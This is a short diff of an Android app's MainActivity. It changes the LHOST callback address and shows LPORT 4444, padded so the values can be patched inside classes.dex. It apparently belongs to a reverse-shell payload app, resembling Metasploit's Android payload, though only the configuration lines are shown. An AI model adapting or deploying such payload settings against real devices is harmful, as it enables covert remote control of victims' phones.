@@ -11,7 +11,7 @@ import android.widget.Button;
 public class MainActivity extends Activity
 {
 	 // avoid re-ordering the strings in classes.dex - append XXXX
-    public static final String LHOST = "XXXX10.0.0.2                       ";
+    public static final String LHOST = "XXXX10.0.0.22                       ";
     public static final String LPORT = "YYYY4444                            "; 
     
     private Intent ServiceIntent;
